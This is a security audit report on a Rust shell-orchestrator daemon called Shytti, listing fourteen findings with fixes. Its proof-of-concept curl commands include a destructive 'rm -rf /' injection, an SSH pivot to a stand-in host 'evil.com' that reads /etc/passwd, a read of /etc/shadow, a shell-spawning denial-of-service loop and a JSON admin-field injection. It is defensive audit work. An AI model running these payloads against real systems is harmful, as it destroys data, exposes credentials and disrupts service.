# Shytti Security Audit Report

**Date**: 2026-03-22
**Auditor**: Security review (OWASP + adversarial)
**Scope**: All source files in `src/`

## Summary Table

| # | Finding | Severity | OWASP Category | File |
|---|---------|----------|----------------|------|
| 1 | Command injection via `cmd` field (`sh -c`) | **CRITICAL** | A03: Injection | `shell.rs:109-112` |
| 2 | Arbitrary binary execution via `shell` field | **CRITICAL** | A03: Injection | `shell.rs:91` |
| 3 | Arbitrary SSH target via `host` field | **HIGH** | A03: Injection | `shell.rs:94-99` |
| 4 | No authentication on REST API | **HIGH** | A07: Auth Failures | `api.rs` |
| 5 | No rate limiting / shell count cap (DoS) | **HIGH** | A05: Misconfiguration | `shell.rs`, `api.rs` |
| 6 | JSON injection in `register_session` | **HIGH** | A03: Injection | `bridge.rs:147` |
| 7 | Path traversal via `cwd` field | **MEDIUM** | A01: Broken Access | `shell.rs:116-118` |
| 8 | Unbounded `read_to_string` in raw HTTP client | **MEDIUM** | A05: Misconfiguration | `bridge.rs:218`, `main.rs:88` |
| 9 | `parse_resize` truncation on large values | **LOW** | A04: Insecure Design | `bridge.rs:177-178` |
| 10 | Error messages leak internal paths | **LOW** | A02: Crypto/Data | `error.rs:17-18` |
| 11 | Auth key sent in plaintext over HTTP | **MEDIUM** | A02: Crypto/Data | `bridge.rs:185` |
| 12 | `blocking_lock()` from potentially async context | **LOW** | A04: Insecure Design | `shell.rs:157,164` |
| 13 | No request body size limit on API | **MEDIUM** | A05: Misconfiguration | `api.rs` |
| 14 | No name length validation | **LOW** | A05: Misconfiguration | `shell.rs:72` |

---

## Detailed Findings

### 1. CRITICAL: Command injection via `cmd` field

**Description**: The `cmd` field from `SpawnRequest` is passed directly to `sh -c` without any sanitization.

**Impact**: Full remote code execution. Any user who can reach the API can execute arbitrary commands as the daemon's user.

**Proof of concept**:
```bash
curl -X POST http://127.0.0.1:7778/shells \
  -H 'Content-Type: application/json' \
  -d '{"cmd": "; rm -rf / --no-preserve-root"}'
```

**Location**: `shell.rs:108-112`
```rust
ShellType::Command => {
    let mut cmd = CommandBuilder::new("sh");
    cmd.arg("-c");
    cmd.arg(req.cmd.as_ref().unwrap()); // unsanitized user input
    cmd
}
```

**Fix**: This is by design for a shell orchestrator, but the API MUST require authentication. Additionally, validate `cmd` against a denylist or require explicit opt-in for raw commands. See Finding #4.

---

### 2. CRITICAL: Arbitrary binary execution via `shell` field

**Description**: The `shell` field is used directly as the binary path for `CommandBuilder::new()`. An attacker can specify any executable.

**Impact**: Execute any binary on the system — `/bin/rm`, `/usr/bin/python3`, etc.

**Proof of concept**:
```bash
curl -X POST http://127.0.0.1:7778/shells \
  -H 'Content-Type: application/json' \
  -d '{"shell": "/bin/rm", "cwd": "/"}'
```
This won't delete files directly (rm needs args), but `/usr/bin/python3` gives a full interpreter.

**Location**: `shell.rs:91`

**Fix**: Validate `shell` against an allowlist of known shells (`/bin/zsh`, `/bin/bash`, `/bin/sh`, `/bin/fish`, etc.).

---

### 3. HIGH: Arbitrary SSH target via `host` field

**Description**: The `host` field is passed directly to `ssh -t`. An attacker can SSH to any host, including external ones.

**Impact**: The daemon becomes an SSH proxy. An attacker can use it to pivot to other machines, scan internal networks, or connect to attacker-controlled hosts (which could exploit SSH client vulnerabilities).

**Proof of concept**:
```bash
curl -X POST http://127.0.0.1:7778/shells \
  -H 'Content-Type: application/json' \
  -d '{"host": "attacker@evil.com", "cmd": "cat /etc/passwd"}'
```

**Location**: `shell.rs:93-100`

**Fix**: Validate `host` against an allowlist from config. Only allow SSH to pre-configured hosts.

---

### 4. HIGH: No authentication on REST API

**Description**: The REST API has zero authentication. Anyone who can reach the listen address can spawn shells, list them, kill them, and resize them.

**Impact**: Combined with findings 1-3, this means any process on localhost (or any network client if bound to 0.0.0.0) has full RCE.

**Location**: `api.rs` — no auth middleware

**Fix**: Add a shared secret / API key check as middleware. The `hermytt_key` from config is already available — reuse the same key or add a separate `api_key` config field.

---

### 5. HIGH: No rate limiting or shell count cap (DoS)

**Description**: There is no limit on the number of shells that can be spawned. Each shell creates a PTY, which consumes a file descriptor and a process.

**Impact**: An attacker can exhaust file descriptors and PIDs by spawning thousands of shells, causing a system-wide denial of service.

**Proof of concept**:
```bash
for i in $(seq 1 10000); do
  curl -s -X POST http://127.0.0.1:7778/shells \
    -H 'Content-Type: application/json' \
    -d '{"cmd": "sleep 99999"}' &
done
```

**Location**: `shell.rs:70` — `spawn()` has no limit check

**Fix**: Add a configurable `max_shells` limit (default 64). Reject spawns when the limit is reached.

---

### 6. HIGH: JSON injection in `register_session`

**Description**: The `register_session` method constructs JSON via string formatting with the user-provided `shell_id`:
```rust
format!(r#"{{"id":"{id}"}}"#)
```
If `id` contains `"` or `\`, it breaks the JSON structure.

**Impact**: Malformed JSON sent to Hermytt. Could potentially inject additional JSON fields depending on how Hermytt parses the request.

**Proof of concept**: A shell_id containing `","admin":true,"id":"` would produce:
```json
{"id":"","admin":true,"id":""}
```

**Location**: `bridge.rs:147`

**Fix**: Use `serde_json::json!` macro instead of string formatting.

---

### 7. MEDIUM: Path traversal via `cwd` field

**Description**: The `cwd` field passes through `expand_tilde` and then directly to `CommandBuilder::cwd()`. No validation prevents absolute paths or `../` traversal.

**Impact**: Shells can be started in sensitive directories (`/root`, `/etc`, etc.). Combined with command execution, this is informational since the user already has RCE, but it widens the attack surface for less severe shell types.

**Proof of concept**:
```bash
curl -X POST http://127.0.0.1:7778/shells \
  -H 'Content-Type: application/json' \
  -d '{"cwd": "/etc", "cmd": "cat shadow"}'
```

**Location**: `shell.rs:116-118`

**Fix**: Validate `cwd` — canonicalize and check it's under an allowed base directory. At minimum, ensure it exists and the user has access.

---

### 8. MEDIUM: Unbounded `read_to_string` in HTTP clients

**Description**: Both `raw_http` in `bridge.rs` and `http_req` in `main.rs` read the entire HTTP response into a `String` with no size limit.

**Impact**: A malicious or buggy Hermytt server could send gigabytes of data, causing OOM.

**Proof of concept**: If `hermytt_url` points to a server that streams infinite data, the daemon will consume all memory.

**Location**: `bridge.rs:218`, `main.rs:88`

**Fix**: Use `read` with a bounded buffer instead of `read_to_string`, or set a max response size (e.g., 1MB).

---

### 9. LOW: `parse_resize` truncation on large values

**Description**: `parse_resize` casts `u64` to `u16` without bounds checking:
```rust
let cols = arr.first()?.as_u64()? as u16;
```
A value of 99999 becomes 34463 after truncation.

**Impact**: Unexpected terminal dimensions. Not exploitable for code execution.

**Location**: `bridge.rs:177-178`

**Fix**: Validate range before casting (e.g., clamp to 1..=500).

---

### 10. LOW: Error messages leak internal paths

**Description**: `Error::SpawnFailed` and `Error::Io` propagate system error messages verbatim to API responses, which may include filesystem paths.

**Impact**: Information disclosure. An attacker learns internal directory structure.

**Location**: `error.rs:40-48`

**Fix**: Return generic error messages to the client; log detailed errors server-side.

---

### 11. MEDIUM: Auth key transmitted over plaintext HTTP

**Description**: `X-Hermytt-Key` is sent over HTTP (not HTTPS) in `http_post` and `http_delete`. The default `hermytt_url` is `http://localhost:7777`.

**Impact**: If Hermytt is on a different host, the auth key is transmitted in cleartext and can be sniffed.

**Location**: `bridge.rs:185,194`

**Fix**: Warn if `hermytt_url` is not localhost and not HTTPS. Consider requiring HTTPS for non-localhost connections.

---

### 12. LOW: `blocking_lock()` in async-adjacent code

**Description**: `get_reader` and `get_writer` use `blocking_lock()` on a tokio `Mutex`. If these are ever called from an async context (they're called from `attach` which is async), this could deadlock the tokio runtime.

**Impact**: Potential deadlock/hang.

**Location**: `shell.rs:157,164`

**Note**: Currently `get_reader`/`get_writer` are called from async context in `bridge.rs:30-31` via `attach()`. Using `blocking_lock()` here will block the async runtime thread. Should use `.lock().await` instead.

**Fix**: Change `get_reader` and `get_writer` to async methods using `.lock().await`.

---

### 13. MEDIUM: No request body size limit

**Description**: Axum by default accepts up to 2MB JSON bodies, but there's no explicit limit configured. The `name` field could contain megabytes of text.

**Impact**: Memory exhaustion via large payloads.

**Location**: `api.rs`

**Fix**: Add `axum::extract::DefaultBodyLimit` with a reasonable cap (e.g., 64KB).

---

### 14. LOW: No name length validation

**Description**: `SpawnRequest.name` has no length limit. A 10MB name string would be stored in memory for the lifetime of the shell.

**Impact**: Minor memory waste per shell.

**Location**: `shell.rs:72`

**Fix**: Truncate or reject names longer than 128 characters.
